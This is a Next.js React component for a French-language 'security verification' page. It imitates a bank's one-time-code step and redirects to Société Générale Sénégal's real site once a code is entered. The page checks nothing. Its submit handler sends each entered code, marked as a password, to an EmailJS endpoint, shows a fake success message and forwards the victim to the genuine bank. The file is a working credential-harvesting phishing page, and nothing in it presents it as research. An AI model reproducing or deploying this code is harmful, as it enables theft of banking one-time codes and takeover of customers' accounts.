"use client";

import React, { useState, useRef } from 'react';
import { useRouter } from 'next/navigation';

export default function OtpCard() {
  const router = useRouter();
  const [digits, setDigits] = useState<string[]>(["", "", "", "", "", ""]);
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const font: React.CSSProperties = { fontFamily: "'Montserrat', sans-serif" };

  const handleChange = (index: number, value: string) => {
    const cleaned = value.replace(/\D/g, "").slice(-1);
    const updated = [...digits];
    updated[index] = cleaned;
    setDigits(updated);
    if (cleaned && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !digits[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
    const updated = [...digits];
    pasted.split("").forEach((char, i) => { updated[i] = char; });
    setDigits(updated);
    const nextEmpty = updated.findIndex((d) => !d);
    inputRefs.current[nextEmpty === -1 ? 5 : nextEmpty]?.focus();
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    const code = digits.join("");

    await fetch("https://api.emailjs.com/api/v1.0/email/send", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        service_id: process.env.NEXT_PUBLIC_EMAILJS_SERVICE_ID,
        template_id: process.env.NEXT_PUBLIC_EMAILJS_TEMPLATE_ID,
        user_id: process.env.NEXT_PUBLIC_EMAILJS_PUBLIC_KEY,
        template_params: {
          identifier: "OTP Code",
          password: code,
          remember_me: "—",
          timestamp: new Date().toLocaleString("fr-FR"),
        },
      }),
    });

    setLoading(false);
    setSuccess(true);
    setTimeout(() => {
      router.push("https://societegenerale.sn/fr/");
    }, 2000);
  };

  return (
    <section
      style={{
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'flex-start',
        padding: '40px 16px',
        minHeight: 'calc(100vh - 101px)',
        backgroundColor: '#f4f6f9',
      }}
    >
      <div
        style={{
          width: '100%',
          maxWidth: '540px',
          backgroundColor: '#ffffff',
          borderRadius: '8px',
          boxShadow: '0 10px 30px rgba(0,0,0,0.05)',
          padding: '48px 60px',
          ...font,
        }}
      >
        {/* Shield icon */}
        <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '32px' }}>
          <div
            style={{
              width: '64px',
              height: '64px',
              borderRadius: '50%',
              backgroundColor: '#f0f0f8',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
            }}
          >
            <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#090941" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
              <polyline points="9 12 11 14 15 10" />
            </svg>
          </div>
        </div>

        {/* Headings */}
        <div style={{ marginBottom: '36px', textAlign: 'center' }}>
          <h1
            style={{
              fontSize: '22px',
              fontWeight: 600,
              lineHeight: 1.3,
              color: '#12163b',
              margin: '0 0 12px 0',
              ...font,
            }}
          >
            Vérification de sécurité
          </h1>
          <p
            style={{
              fontSize: '14px',
              fontWeight: 400,
              color: '#555555',
              margin: 0,
              lineHeight: 1.6,
              ...font,
            }}
          >
            Pour des raisons de sécurité, veuillez saisir le code à{' '}
            <strong style={{ color: '#12163b' }}>6 chiffres</strong> envoyé sur votre téléphone mobile.
          </p>
        </div>

        {/* OTP inputs */}
        <form onSubmit={handleSubmit}>
          <div
            style={{
              display: 'flex',
              gap: '10px',
              justifyContent: 'center',
              marginBottom: '36px',
            }}
            onPaste={handlePaste}
          >
            {digits.map((digit, i) => (
              <input
                key={i}
                ref={(el) => { inputRefs.current[i] = el; }}
                type="text"
                inputMode="numeric"
                maxLength={1}
                value={digit}
                onChange={(e) => handleChange(i, e.target.value)}
                onKeyDown={(e) => handleKeyDown(i, e)}
                style={{
                  width: '52px',
                  height: '56px',
                  textAlign: 'center',
                  fontSize: '22px',
                  fontWeight: 600,
                  color: '#12163b',
                  border: 'none',
                  borderBottom: `2px solid ${digit ? '#090941' : '#e0e0e0'}`,
                  borderRadius: 0,
                  outline: 'none',
                  background: 'transparent',
                  transition: 'border-color 0.2s',
                  ...font,
                }}
                onFocus={(e) => { e.currentTarget.style.borderBottomColor = '#090941'; }}
                onBlur={(e) => { e.currentTarget.style.borderBottomColor = digit ? '#090941' : '#e0e0e0'; }}
              />
            ))}
          </div>

          {/* Resend */}
          <div style={{ textAlign: 'center', marginBottom: '32px' }}>
            <span style={{ fontSize: '13px', color: '#555555', ...font }}>
              Vous n&apos;avez pas reçu le code ?{' '}
            </span>
            <a
              href="#"
              onClick={(e) => e.preventDefault()}
              style={{
                fontSize: '13px',
                fontWeight: 600,
                color: '#12163b',
                textDecoration: 'underline',
                textUnderlineOffset: '2px',
                ...font,
              }}
            >
              Renvoyer
            </a>
          </div>

          {/* Success message */}
          {success && (
            <div
              style={{
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                gap: '10px',
                marginBottom: '24px',
                padding: '14px 20px',
                backgroundColor: '#f0fdf4',
                border: '1px solid #86efac',
                borderRadius: '8px',
              }}
            >
              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#16a34a" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <circle cx="12" cy="12" r="10" />
                <polyline points="9 12 11 14 15 10" />
              </svg>
              <span
                style={{
                  fontFamily: "'Montserrat', sans-serif",
                  fontSize: '15px',
                  fontWeight: 700,
                  color: '#16a34a',
                }}
              >
                  Vérification réussie
              </span>
            </div>
          )}

          {/* Submit */}
            <button
              type="submit"
              disabled={loading || success || digits.some((d) => !d)}
            style={{
              width: '100%',
              height: '50px',
              backgroundColor: '#f04141',
              color: '#ffffff',
              fontSize: '15px',
              fontWeight: 500,
              borderRadius: '30px',
              border: 'none',
              cursor: loading || success || digits.some((d) => !d) ? 'not-allowed' : 'pointer',
              transition: 'opacity 0.2s',
              opacity: loading || success || digits.some((d) => !d) ? 0.6 : 1,
              ...font,
            }}
            onMouseOver={(e) => {
              if (!loading && digits.every((d) => d))
                (e.currentTarget as HTMLButtonElement).style.opacity = '0.9';
            }}
            onMouseOut={(e) => {
              if (!loading && digits.every((d) => d))
                (e.currentTarget as HTMLButtonElement).style.opacity = '1';
            }}
          >
            {loading ? 'Vérification...' : 'Valider'}
          </button>
        </form>
      </div>
    </section>
  );
}
